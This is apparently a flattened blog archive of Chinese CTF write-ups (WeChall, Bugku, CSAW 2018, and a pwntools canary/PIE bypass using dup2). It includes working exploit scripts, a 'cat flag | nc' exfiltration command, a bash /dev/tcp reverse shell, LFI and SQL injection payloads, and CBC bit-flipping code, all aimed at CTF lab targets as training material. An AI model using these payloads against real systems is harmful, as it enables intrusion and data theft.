[\"aaaaa\",\"aaaab\",\"aaaba\",\"aaabb\",\"aabaa\",\"aabab\",\"aabba\",\"aabbb\",\"abaaa\",\"abaab\",\"ababa\",\"ababb\",\"abbaa\",\"abbab\",\"abbba\",\"abbbb\",\"baaaa\",\"baaab\",\"baaba\",\"baabb\",\"babaa\",\"babab\",\"babba\",\"babbb\",\"bbaaa\",\"bbaab\"]second_cipher = [\"aaaaa\",\"aaaab\",\"aaaba\",\"aaabb\",\"aabaa\",\"aabab\",\"aabba\",\"aabbb\",\"abaaa\",\"abaaa\",\"abaab\",\"ababa\",\"ababb\",\"abbaa\",\"abbab\",\"abbba\",\"abbbb\",\"baaaa\",\"baaab\",\"baaba\",\"baabb\",\"baabb\",\"babaa\",\"babab\",\"babba\",\"babbb\"]keyword1 = \"\"keyword2 = \"\"keyword3 = \"\"keyword4 = \"\"for one in arr: toab1 = \"\" toab2 = \"\" for i in one: if i.isupper(): toab1 += 'b' toab2 += 'a' else: toab1 += 'a' toab2 += 'b' for local,ab in enumerate(first_cipher): if ab == toab1: keyword1 += alphabet[local] if ab == toab2: keyword3 += alphabet[local] for local,ab in enumerate(second_cipher): if ab == toab1: keyword2 += alphabet[local] if ab == toab2: keyword4 += alphabet[local]print(keyword1)print(keyword2)print(keyword3)print(keyword4) 在输出中匹配‘is’，（别问为什么可以如此操作，，，直觉）并替换‘x’为空格。即可得出flag：iblpsclsennp 3、Repeating History (Research)打开题中给出的github项目地址，找到该题目的文件夹。发现有两个文件夹，然后，，找。。。 先打开history 然后在install.php中可以找到$solution = ‘2bda2998d9b0ee197da142a0447f6725’; 进行md5解码可得“wrong”，发现是错误的。再查看提交记录。 查看图示中的历史 可以找到真实的solution。 翻遍这个文件夹也没有找到其他信息，返回打开repeating文件夹，可以找到第一部分。 1Oh right... the solution to part one is &apos;&lt;?php /*InDaxIn*/ ?&gt;&apos; without the PHP comments and singlequotes. 所以，flag为：InDaxInNothingHereMoveAlong 4、PHP 0818 (Exploit, PHP)审计，可以看到要提交的魔数，但在前面的for循环中又不允许出现“1-9”的数字。同时，return时用的是“==”而不是“===”，所以可能是弱类型利用。将魔数进行16进制转换，可以得到：deadc0de，0并不在其中。所以提交0xdeadc0de，解决问题。 5、Warchall: Live LFI (Linux, Exploit, Warchall)文件包含，打开链接，发现只有设置网站语言的地方有参数传递，所以尝试构造：http://lfi.warchall.net/index.php?lang=solution.php。 一看有戏，尝试读取文件源码。这里介绍读源码的两种： ?file=data:text/plain,&lt;?php system(&quot;cat solution.php&quot;)?&gt; ?file=php://filter/read=convert.base64-encode/resource=index.php 构造：http://lfi.warchall.net/?lang=php://filter/read=convert.base64-encode/resource=solution.php。 Base64解密后可得：SteppinStones42Pie 6、Warchall: Live RFI (Linux, Exploit, Warchall)与上题类似，读取文件，构造：http://rfi.warchall.net/index.php?lang=php://filter/read=convert.base64-encode/resource=solution.php。 Base64解码： 123456&lt;html&gt;&lt;body&gt;&lt;pre&gt;NOTHING HERE????&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php return &apos;Low_H4NGING_Fruit&apos;; ?&gt; 这里也可以用：http://rfi.warchall.net/index.php?lang=data:text/plain,&lt;?php system(&quot;cat solution.php&quot;)?&gt;。 点击查看源代码： 手工，提交。 7、Can you read me (Coding, Image)Description A friend and me have a bet running, that you won&apos;t beat his OCR program in scanning text out of images. His average scan time is 2.5 seconds, can you beat that? 要求在2.5s内识别并提交，首先安装tesseract： 1apt install tesseract-ocr。 编写python脚本： 123456789101112131415import requestsimport oscookie = { 'WC':'9953502-36792-3nWdWNVeHmWfnYj',}html = requests.get('http://www.wechall.net/challenge/can_you_readme/gimme.php', cookies=cookie)png = open('png.jpg', 'wb').write(html.content) #写图片要使用二进制，并且使用html.content，而不是html.textlog = os.system('tesseract png.jpg png -l eng')keyword = open('dec.txt', 'r').readline().rstrip('\\n')print('keyword is ' + keyword)url = 'http://www.wechall.net/challenge/can_you_readme/index.php?solution={0}&amp;cmd=Answer'.format(keyword)page = requests.get(url, cookies=cookie)print(page.text) 搞定。","link":"/2017/11/wechall-write1/"},{"title":"bypass pie use partial overwrite and dup2","text":"前言&emsp;&emsp;这篇文章记录如何使用partial overwrite绕过pie和使用dup2重定向输入输出流到socket。 题目&emsp;&emsp;简单描述下题目的环境，首先服务端使用fork进程来为每个用户建立socket来进行通信，主要逻辑如下： &emsp;&emsp;其中在read_msg使用socket的recv接收用户输入，同时漏洞也产生在这。 &emsp;&emsp;由于是fork，所以fork得到进程有父进程一样的存储数据，如果开启了canary，那么每次socket连接得到的进程的canary cookie都是跟父进程一样的，这也是我们爆破的前提。 &emsp;&emsp;接下来checksecbinary，查看程序开启的保护，得到： Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled &emsp;&emsp;如上，程序把基本的保护都开了。 &emsp;&emsp;在简单的栈溢出中，我们的直接目的就是覆盖函数的返回地址从而达到控制程序执行流的目的，而canary防护就是在返回地址的前面，加上一串随机的字符，每次程序ret时，对这串字符进行检查，如果这个值跟系统记录的值有所差异，系统就会终止程序执行，达到保护的作用。用gdb调试时可以发现： &emsp;&emsp;如图，1是canary cookie的位置，而2是要覆盖的返回地址的位置。从图中可以知道要覆盖到2，必然会先覆盖1，所以，如果我们无法得到1的值，那么就算覆盖了2位置，程序在返回时检查cookie也会失败，然后停止执行，最终exp失败。 &emsp;&emsp;前面说过，fork出来的进程内存数据是跟父进程一样的，那么对于canary我们可以通过爆破的方式找到，并且由于cookie（通常为0xXXXXXX00）的最低一个字节为0，我们其实只要爆破3个字节就行。 &emsp;&emsp;然后再解释一下ASLR跟PIE的关系与区别： ASLR&emsp;&emsp;ASLR有三级，分别为: 0: 关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同 1: 普通的ASLR。mmap基地址、栈（stack）基地址、.so加载基地址都将被随机化，但是堆没用随机化 2: 增强的ASLR，增加了堆随机化 PIE&emsp;&emsp;而PIE是对代码段、数据段进行地址随机化，但是最终决定是否随机化的靠看ASLR，如果ASLR是关闭的，那么就算开启了PIE也不会进行地址随机化。 &emsp;&emsp;开启了PIE后，在IDA里看到的就是偏移地址，真实地址需要code base address + offset得到。 &emsp;&emsp;对于pie的绕过目前有partial overwrite的方法，因为code base address的低12bit都是0，如图： &emsp;&emsp;所以我们可以通过控制最低一个字节来控制程序的执行流，然后找到可以作为参考的点，进行爆破判断，原理上类似于爆破canary cookie。 &emsp;&emsp;在这道题中，在原来本该返回的地址下方有一个给用户(客户端)send消息的函数，那么我们就可以利用这个地址作为我们爆破的点。我们以服务端是否有消息发送过来作为爆破成功的依据。&emsp;&emsp;我们知道send_client函数（0x00001177）的最低一个字节是\\x77，因为代码段基地址在上面中我们可以看到是0x56561000，所以不管怎么加，它的真实地址的最低一个字节都是\\x77。当我们猜中它的地址时它就会发送一些奇怪的东西，因为它调用时栈还是乱七八槽的，但确实能得到数据，如我这里得到的\\xb0\\x1d\\x1b，那我每次都以这个为准。&emsp;&emsp;最终exp可以写成：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108# -*- coding:utf-8 -*-from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')# ip = '192.168.210.11'ip = '127.0.0.1'# 'a' * 64 + p32(canary) + 'a' * 12 + p32(ret_addr)def fuzz(): canary = \"\\x00\" for i in range(3): for j in range(1, 256): if j == 10: continue p = remote(ip, 10007) print p.recvline() temp = canary + chr(j) payload = 'A' * 4 * 4 * 4 + temp p.sendline(payload) try: print p.recvuntil('See you again!\\n') canary = temp break except: pass print \"[***] found canary : \" + canary# fuzz()canary = 0x1b617500def fuzz_send_client(): code_base = \"\\x77\" ok = False for i in range(3): for j in range(1, 256): if j == 10: continue p = remote(ip, 10007) print p.recvline() temp = code_base + chr(j) payload = 'a' * 64 + p32(canary) + 'b' * 12 + temp if j == 145: pause() p.sendline(payload) p.sendline(payload) try: print p.recvuntil('\\xb0\\x1d\\x1b') code_base = temp ok = True break except: pass if not ok: print \"[!!!] Oops!!!\" exit(-1) code_base = hex(u32(code_base) - 0x1177) print \"[***] found code_base : \" + code_base# fuzz_send_client()code_base = 0x5655e000pelf = ELF('./pie')libc = ELF('./libc.so.local')p = remote(ip, 10007)p.recvline()main_addr = code_base + 0x00000F3Csend_addr = code_base + 0x00000E8Clibc_start_main = code_base + pelf.got[\"__libc_start_main\"]payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(send_addr) + p32(main_addr) + p32(4) + p32(libc_start_main) + p32(16)pause()p.sendline(payload)libc_start_main = u32(p.recv()[:4])p.close()log.debug(\"libc_start_main: \" + hex(libc_start_main))libc_base_addr = libc_start_main - libc.symbols[\"__libc_start_main\"]log.debug(\"libc_base_addr: \" + hex(libc_base_addr))system_addr = libc_base_addr + libc.symbols[\"system\"]log.debug(\"system_addr: \" + hex(system_addr))bss_addr = code_base + 0x00003084recv_addr = code_base + 0x00000DDAshellcode = \"cat flag | nc ip 9999\"log.debug(\"ready to write bss...\")pause()p = remote(ip, 10007)p.recvline()payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(recv_addr) + p32(system_addr) + p32(4) + p32(bss_addr) + p32(len(shellcode)) + p32(0)p.sendline(payload)log.debug(\"ready to write shelloce...\")pause()p.sendline(shellcode)p.close()# log.debug(\"call system...\")# pause()# p = remote(ip, 10007)# p.recvline()# payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(system_addr) + p32(system_addr) + p32(bss_addr)# p.sendline(payload)# 0xf75c9c94: call 0xf763f7e0 &lt;execve&gt; p.interactive()&emsp;&emsp;fuzz和fuzz_send_client分别爆破canary cookie和程序基地址，其实他们都一种手法。&emsp;&emsp;这里还需要特别说明的是exp在：12345payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(recv_addr) + p32(system_addr) + p32(4) + p32(bss_addr) + p32(len(shellcode)) + p32(0)p.sendline(payload)log.debug(\"ready to write shelloce...\")p.sendline(shellcode)&emsp;&emsp;就已经攻击成功，一开始我还有些疑惑，可以看到那些注释了的代码才是我原本的思路，我还需要return到system调用shellcode。12payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(system_addr) + p32(system_addr) + p32(bss_addr)p.sendline(payload)&emsp;&emsp;但是事实上，在recv_addr执行完跳到system_addr的时候栈内的数据刚好满足system调用shellcode。而且按照原来的思路：先把shellcode写到bss段，然后再起一个连接执行system(bss_shellcode)。但在调试过程中发现，bss段在每个连接中都会被清0，并不能保存上一个进程写入的shellcode。&emsp;&emsp;在p.sendline(shellcode)执行后的程序栈如下： &emsp;&emsp;我单独对system调用写了一个简单的程序，对他调试到system处的情况： &emsp;&emsp;可以看到在进入system时的栈情况都相同，栈顶为返回地址，接下去是参数。 解法二&emsp;&emsp;上面之所以采用反弹的方式是因为socket不能作为程序的输入输出流，因为主程序运行在服务器上，所以即使你/bin/sh成功，你也收不到shell，只会在服务器端开启一个shell。如果我们能够重定向输入输出流到socket，那么我们就能拿到一个shell。 &emsp;&emsp;在Linux中有一个dup2的程序，其官方解释如下： 12345678910dup, dup2, dup3 - duplicate a file descriptorThe dup() system call creates a copy of the file descriptor oldfd,using the lowest-numbered unused file descriptor for the newdescriptor.The dup2() system call performs the same task as dup(), but insteadof using the lowest-numbered unused file descriptor, it uses the filedescriptor number specified in newfd. If the file descriptor newfdwas previously open, it is silently closed before being reused. &emsp;&emsp;它的作用就是重定向一个文件描述符，Linux的理念就是一切皆文件，输入输出也一样。 1230: 进程的标准输入相关联1: 进程的标准输出相关联2: 进程的标准错误输出相关联 &emsp;&emsp;而socket的文件描述符在此环境中为4。那么我们就可以使用： dup2(4, 0) dup2(4, 1) &emsp;&emsp;来把输入输出定向到socket上。 &emsp;&emsp;因为dup2只对当前进程有效，不能说我先用两个连接(进程)来启动dup2，之后就直接调system。我们必须在一次连接中完成重定向输入输出和调用system。那么我们怎么构造payload呢？一般我们都是return一次，如： 12# 执行完recv，就跳到system，但不能再跳了payload = &apos;a&apos; * 64 + p32(canary) + &apos;b&apos; * 12 + p32(recv_addr) + p32(system_addr) + p32(4) + p32(bss_addr) + p32(len(shellcode)) + p32(0) &emsp;&emsp;这里我们使用一个gadget：pop pop ret。因为我们dup2的参数有两个，所以我们要pop两次才能维持栈平衡，不影响下一个调用。这里的gadget可以用ROPgadget查找。 &emsp;&emsp;最终的exp如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding:utf-8 -*-from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')# ip = '192.168.210.11'ip = '127.0.0.1'canary = 0x1b617500code_base = 0x5655e000pelf = ELF('./pie')libc = ELF('./libc.so.local')p = remote(ip, 10007)p.recvline()main_addr = code_base + 0x00000F3Csend_addr = code_base + 0x00000E8Clibc_start_main = code_base + pelf.got[\"__libc_start_main\"]payload = 'a' * 64 + p32(canary) + 'b' * 12 + p32(send_addr) + p32(main_addr) + p32(4) + p32(libc_start_main) + p32(16)pause()p.sendline(payload)libc_start_main = u32(p.recv()[:4])p.close()log.debug(\"libc_start_main: \" + hex(libc_start_main))libc_base_addr = libc_start_main - libc.symbols[\"__libc_start_main\"]log.debug(\"libc_base_addr: \" + hex(libc_base_addr))system_addr = libc_base_addr + libc.symbols[\"system\"]log.debug(\"system_addr: \" + hex(system_addr))binsh_addr = libc_base_addr + next(libc.search('/bin/sh'))log.debug(\"binsh_addr: \" + hex(binsh_addr))dup2_adddr = libc_base_addr + libc.symbols[\"dup2\"]log.debug(\"dup2_adddr: \" + hex(dup2_adddr))ppr_addr = code_base + 0x0000122Alog.debug(\"use dup2 to call system sh...\")pause()p = remote(ip, 10007)p.recvline()padding = 'a' * 64 + p32(canary) + 'b' * 12payload = padding + p32(dup2_adddr) + p32(ppr_addr) + p32(4) + p32(1) + p32(dup2_adddr) + p32(ppr_addr) + p32(4) + p32(0)payload += p32(system_addr) + p32(0) + p32(binsh_addr)p.sendline(payload)p.interactive() 参考链接 https://blog.csdn.net/silent123go/article/details/71108501 http://blog.51cto.com/duallay/1876841 https://zoepla.github.io/2018/07/_pie_%E7%88%86%E7%A0%B4ebx+dup2/ http://man7.org/linux/man-pages/man2/dup.2.html https://blog.csdn.net/silent123go/article/details/71108501","link":"/2018/11/pie-bypass-overwrite-dup2/"},{"title":"Bugku writeup4","text":"weblogin1(SKCTF)&emsp;&emsp;题目描述： &emsp;&emsp;这道题用的是sql约束攻击，利用的是数据库字段定义时产生的漏洞。如：1234mysql&gt; CREATE TABLE users ( -&gt; username varchar(25), -&gt; password varchar(25) -&gt; );&emsp;&emsp;这里的username只允许25个字符，超过后就舍去25字符以后的，然后在mysql中，admin跟admin [很多空格]在查询的时候是一样的。因为admin用户已经存在，但我们不知道他的密码，所以我们自己注册一个admin然后替换掉密码。所以我们可以注册一个admin[很多个空格]1的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用admin加你的密码去登陆即可得到flag。### md5 collision(NUPT_CTF)&emsp;&emsp;这道题是MD5碰撞，PHP在进行比较运算时，如果遇到了0e\\d+这种字符串，就会将这种字符串解析为科学计数法，然后0 == 字符串是成立的，从而绕过了MD5检查，这里记录一些MD5值：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020### 文件包含2&emsp;&emsp;打开题目，在源代码中发现了upload.php &emsp;&emsp;访问后发现是文件上传，但是只支持图片文件，不够这里没关系，不用考虑怎么绕过，因为文件包含的时候会使用php解析： &emsp;&emsp;上传一句话 &emsp;&emsp;但是访问后发现存在过滤，&lt;?php被替换成_。如下图： &emsp;&emsp;但是我们可以使用&lt;script language=php&gt; &lt;/script&gt;标签绕过这个验证，我们再上传一次： &emsp;&emsp;可以看到，后台已经成功的解析了我们的php代码。接着使用菜刀连接。 &emsp;&emsp;最终我们能拿到flag：SKCTF{uP104D_1nclud3_426fh8_is_Fun}。### flag.php&emsp;&emsp;题目： &emsp;&emsp;打开页面后发现提交表单没有反应，然后想起题目提示，所以尝试一下get一个请求。然后可以找到源码： &emsp;&emsp;这里有些诱惑性的东西，它故意在最后放出了$key的值，然而当你拿着$KEY='ISecer:www.isecer.com';去序列化后提交会发现是不对的。 &emsp;&emsp;其实这道题用得知识跟数字与字符串比较的绕过方式有点相似，首先$KEY的值是没有定义的，但是我们可以构造s:0:&quot;&quot;;字符串，他反序列化的结果就是一个空的字符串，然后绕过他的比较。 &emsp;&emsp;此时flag就出来了。### sql注入2&emsp;&emsp;题目描述： &emsp;&emsp;这道题尝试了很多注入但都没有成功，后来经过看网上的writeup，才发现是.DS_Store泄露，然后网上找了个exp，运行后就能得到flag文件。 &emsp;&emsp;flag就是：flag{sql_iNJEct_comMon3600!}。### 孙xx的博客&emsp;&emsp;题目描述： &emsp;&emsp;这里提示信息搜集，所以我们扫一扫目录： &emsp;&emsp;这里扫出了phpmyadmin的目录，然后再去网站上看看，然后就能发现数据库的用户名和密码。 &emsp;&emsp;我们拿去登陆一下，就能发现flag。 报错注入&emsp;&emsp;题目描述： &emsp;&emsp;可以看到这里过滤了很多字符，包括空格，但由于mysql的特性，我们可以使用回车换行符还替代即%0a或%0d。&emsp;&emsp;因为要进行报错注入，所以我们可以使用extractvalue()或者updatexml()进行报错，尝试一条报错语句：12?id=1%0aand%0aextractvalue(1,concat(0x7e,(select%0a@@version),0x7e))?id=1%0aand%0aupdatexml(1,concat(0x7e,(select%0a@@version),0x7e),1) &emsp;&emsp;可以看到已经成功报错，这里把%0a换成%0d也是可以的。要读取文件，mysql提供了load_file()函数，并且需要对文件名进行16进制编码。又因为extractvalue()有长度限制,最长为32位，所以我们需要使用substr()对hex()过的文件内容进行分割，我们一次取30个就好。这里注意的是如果不对文件内容进行16进制编码就会出现无法读取的情况。1?id=1%0aand%0a(extractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30))),0x7e)&emsp;&emsp;最终我们能拿到一串16进制的字符，然后解密就可以得到flag： &emsp;&emsp;但这里最坑的就是双引号是中文的”，所以直接复制题目给的flag形式，然后把双引号里的值粘贴进去就行了。### login3(SKCTF)&emsp;&emsp;打开题目，发现过滤了很多字符，包括空格 , = and，所以这给我们注入带来极大的不便，但是or select &gt;没有被过滤，我们先找到闭合字符。而且我们注意到，页面使用的是en编码，所以可以考虑宽字节注入。 &emsp;&emsp;然后我们构造了验证poc：username=admin%df%27or'1'&gt;'1&amp;password=admin跟username=admin%df%27or'2'&gt;'1&amp;password=admin。 &emsp;&emsp;可以看到当or返回真时它会检查password是否正确，而当or返回假时会报没有此用户的错误，所以，我们可以接着构造我们的payload。下面是我的payload：1username=admin%df%27or(select(password))&gt;&apos;0&amp;password=admin&emsp;&emsp;我们只需要不断刷新&gt;'后面的字符就能把密码给注入出来，这里值得注意的是最后一个值的确定，可以看到当最后一个字符为/时页面返回了真，而为0时则返回了假。 &emsp;&emsp;因为我们使用的是&gt;来进行判断的，所以最后的一个值一定会比真实值小，也就是说我们最后一位应该取0才是正确的。所以最终md5值：51b7a76d51e70b419f60d3473fb6f900。解密出来就是：skctf123456。然后我们登陆一下就能获得flag。 &emsp;&emsp;ps：本来这里是打算写脚本跑的，但因为判断条件在脚本里无法使用，在postman中也不能作为判别的依据，所以，这个方法只能在burpsuite跟zap上使用。 Trim的日记本&emsp;&emsp;打开页面后如下： &emsp;&emsp;然后随手注册了以一个账号，但发现不知道id无法登陆，所以就拿出了目录扫描器看看有什么发现。 &emsp;&emsp;然后这里还真的有发现，我们访问一下show.php。 &emsp;&emsp;可以发现一个flag，拿去提交还真是真的flag。所以这道题就so easy了。。。 login2(SKCTF)&emsp;&emsp;这道题就是学习姿势了，自己做的时候没有找到思路，然后看了writeup才做出来。 &emsp;&emsp;对请求抓包，然后可以发现tip，解密出来是几行代码。 123$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";if (!empty($row) &amp;&amp; $row['password']===md5($password)){} &emsp;&emsp;这里可以看到它是分离式的验证，首先查询username的用户，然后拿出password再进行比较，一开始想着是注入出admin的密码，但发现可能没有这个用户，而且也找不到注入的poc。后来参考网上的writeup才知道正确的打开方式。payload：1username=&apos; union select md5(1),md5(1)#&amp;password=1 &emsp;&emsp;执行这条语句时由于前面的username为空，所以没有数据返回，但后面的union select md5(1),md5(1)则会返回两个MD5(1)的值，然后password我们也置为1，从而绕过if语句的判断。 &emsp;&emsp;接下来可以进入命令执行的页面。 &emsp;&emsp;然后我们反弹回一个shell来方便我们操作。我们先在本地监听一下，这里使用nc。1nc -lvv 8888 &emsp;&emsp;然后执行反弹shell的命令。1|bash -i &gt;&amp; /dev/tcp/你的公网ip/8888 0&gt;&amp;1 &emsp;&emsp;最后就能在服务器上收到shell，然后查询flag。 &emsp;&emsp;所以flag：SKCTF{Uni0n_@nd_c0mM4nD_exEc}。 login4（CBC字节翻转攻击）&emsp;&emsp;这道题就纯属学习姿势了，首先是进行敏感目录扫描，然后发现.index.php.swp源码泄露。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phpdefine(\"SECRET_KEY\", file_get_contents('/root/key'));define(\"METHOD\", \"aes-128-cbc\");session_start();function get_random_iv(){ $random_iv=''; for($i=0;$i&lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv;}function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION['username'] = $info['username']; setcookie(\"iv\", base64_encode($iv)); setcookie(\"cipher\", base64_encode($cipher));}function check_login(){ if(isset($_COOKIE['cipher']) &amp;&amp; isset($_COOKIE['iv'])){ $cipher = base64_decode($_COOKIE['cipher']); $iv = base64_decode($_COOKIE[\"iv\"]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(\"&lt;p&gt;base64_decode('\".base64_encode($plain).\"') can't unserialize&lt;/p&gt;\"); $_SESSION['username'] = $info['username']; }else{ die(\"ERROR!\"); } }}function show_homepage(){ if ($_SESSION[\"username\"]==='admin'){ echo '&lt;p&gt;Hello admin&lt;/p&gt;'; echo '&lt;p&gt;Flag is $flag&lt;/p&gt;'; }else{ echo '&lt;p&gt;hello '.$_SESSION['username'].'&lt;/p&gt;'; echo '&lt;p&gt;Only admin can see flag&lt;/p&gt;'; } echo '&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;';}if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])){ $username = (string)$_POST['username']; $password = (string)$_POST['password']; if($username === 'admin'){ exit('&lt;p&gt;admin are not allowed to login&lt;/p&gt;'); }else{ $info = array('username'=&gt;$username,'password'=&gt;$password); login($info); show_homepage(); }}else{ if(isset($_SESSION[\"username\"])){ check_login(); show_homepage(); }else{ echo '&lt;body class=\"login-body\"&gt; &lt;div id=\"wrapper\"&gt; &lt;div class=\"user-icon\"&gt;&lt;/div&gt; &lt;div class=\"pass-icon\"&gt;&lt;/div&gt; &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt; &lt;div class=\"header\"&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=\"content\"&gt; &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt; &lt;/div&gt; &lt;div class=\"footer\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;'; }}?&gt; &emsp;&emsp;因为admin用户被禁止了登陆，但是可以利用反序列化漏洞重置$_SESSION['username']为admin，然后拿到flag。 &emsp;&emsp;首先介绍一下CBC字节翻转攻击，如果我们要想把第二行（段）中的2变成n，我们只需要修改第一行（段）的r。1234567原文：a:2:{s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:5:&quot;skctf&quot;;}按16个字符分割：a:2:{s:8:&quot;username&quot;;s:5:&quot;admi2&quot;;s:8:&quot;password&quot;;s:5:&quot;skctf&quot;;} &emsp;&emsp;修改方式就是：12bs_de = 'a:2:{s:8:\"username\";s:5:\"admi2\";s:8:\"password\";s:5:\"skctf\";}'bs_de=bs_de[0:13]+chr(ord(bs_de[13]) ^ ord('2') ^ ord('n'))+bs_de[14:] &emsp;&emsp;我们把cookie中的cipher拿出来修改一下。1234567891011# -*- coding:utf-8 -*-import base64bs = 'e8SnC9p3aEmJciIN8NWYM1PcA/A7jSwsiTglqdBMLRLf/8LOHKmhOoHSOBbJB1xEnE6S6DpfgkD8NWlJETxDZQ=='bs_de = base64.b64decode(bs)ch = chr(ord(bs_de[13]) ^ ord('2') ^ ord('n'))bs_de=bs_de[0:13]+ch+bs_de[14::]print(base64.b64encode(bs_de)) &emsp;&emsp;然后把得到的结果替换掉cipher，访问后可以发现反序列化出错了。 &emsp;&emsp;这是因为在修改第二段明文的时候我们把第一段的密文破环掉了，造成后台无法解密出原来的数据。如下面这种情况。 &emsp;&emsp;当将6修改成7的时候，造成了第一段密文解密出来的结果变成了乱码，所以我们还需要还原第一段的密文，所以我们要对iv这个初始向量进行修改。 &emsp;&emsp;修改的方法还是跟上面一样的套路，只不过这里的cipher要变成上面提示反序列化错误的那个密文。因为这个反序列化错误的字符是第一次翻转后的明文。 &emsp;&emsp;所以，我们修改的代码如下：1234567891011import base64mingwen_de='xvFs8hcryE3UwXuTa5b+7W1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjg6IlBhc3N3b3JkIjt9'mingwen = base64.b64decode(mingwen_de)iv = 'wJdHFG15Qc2hs1bkgMHd4w=='iv_de = base64.b64decode(iv)new = 'a:2:{s:8:\"userna'for i in range(16): iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+1:]print(base64.b64encode(iv_de)) &emsp;&emsp;将得到的结果替换到iv上，然后刷新页面，就能看到flag了。 &emsp;&emsp;参考链接：CBC字节翻转攻击CBC字节翻转攻击","link":"/2018/03/bugku-writeup4/"},{"title":"CSAW 2018 复现writeup","text":"_&emsp;&emsp;补补web Websso123456789Don&apos;t you love undocumented APIsBe the admin you were always meant to behttp://web.chal.csaw.io:9000Update chal description at: 4:38 to include solve detailsAesthetic update for chal at Sun 7:25 AM &emsp;&emsp;打开源代码如下：1234567&lt;h1&gt;Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!&lt;/h1&gt;&lt;a href=\"/protected\"&gt;.&lt;/a&gt;&lt;!--Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guessPOST /oauth2/tokenPOST /oauth2/authorize form-data TODO: make a form for this route--!&gt; &emsp;&emsp;关于OAUTH2.0的授权的详细模式可以参考这篇文章的六、授权码模式。 &emsp;&emsp;授权模式大致流程如下： 获取Authorization Code，通常访问/authorize 请求的参数： response_type：表示授权类型，必选项，此处的值固定为”code” client_id：表示客户端的ID，必选项 redirect_uri：表示重定向URI，可选项 scope：表示申请的权限范围，可选项 state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。 获取Access Token，通常访问/token 请求的参数： grant_type：表示使用的授权模式，必选项，此处的值固定为”authorization_code”。 code：表示上一步获得的授权码，必选项。 redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。 client_id：表示客户端ID，必选项。 访问限制资源，比如这里的/protected &emsp;&emsp;所以第一步，获取Authorization Code。 &emsp;&emsp;然后在我们的服务器上能收到： &emsp;&emsp;拿到code：&emsp;&emsp;再去拿到token。 &emsp;&emsp;得到token：&emsp;&emsp;将这个token拿到jwt.io/解密。 &emsp;&emsp;这里的secret就是加密秘钥，所以我们可以将type改为admin。 &emsp;&emsp;我们拿着这个token去访问/protected。 &emsp;&emsp;得到flag：flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}。#### 